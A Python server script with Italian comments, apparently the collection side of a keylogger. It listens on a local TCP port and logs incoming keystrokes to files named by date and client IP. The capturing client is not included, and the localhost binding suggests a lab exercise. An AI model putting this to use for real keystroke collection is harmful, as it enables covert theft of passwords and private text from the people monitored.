# Server Program
import socket
import logging
from datetime import date

socketOpened = False
while not socketOpened:
    # Crea il socket "stream based" basato sul protocollo TCP ed indirizzi IPv4
    serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    socketOpened = True

    # Binding del socket e attesa di connessione da parte del client
    serverSocket.bind(("127.0.0.1",9090))
    print("> In attesa di connessione...")
    serverSocket.listen()

    # Avvenuta connessione da parte del processo client
    (clientConnected, clientAddress) = serverSocket.accept()
    print("  >> Client connesso. (%s:%s)" % (clientAddress[0], clientAddress[1]))

    # Inizializzazione del file di log in cui salvare i tasti digitati
    logging.basicConfig(filename=("./DATE_%s-IP_%s.txt" % (date.today().strftime("%d.%m.%Y"), clientAddress[0])), level=logging.DEBUG, format="[%(asctime)s] | %(message)s", datefmt='%H:%M:%S')
    logging.info("# Client connesso #")

    # Ricezione caratteri digitati dal client 
    counter = 0
    while(socketOpened):
        try:
            dataFromClient = clientConnected.recv(16).decode().replace('\'', '')
            if(dataFromClient != ''):
                counter = 0
                logging.info(dataFromClient)
            else:
                counter += 1
                if counter == 100:
                    logging.info("# Client disconnesso #")
                    print("     >>> Client disconnesso.")
                    serverSocket.close()
                    socketOpened = False

        except socket.error:
            print("     >>> Client disconnesso.")
            serverSocket.close()
            socketOpened = False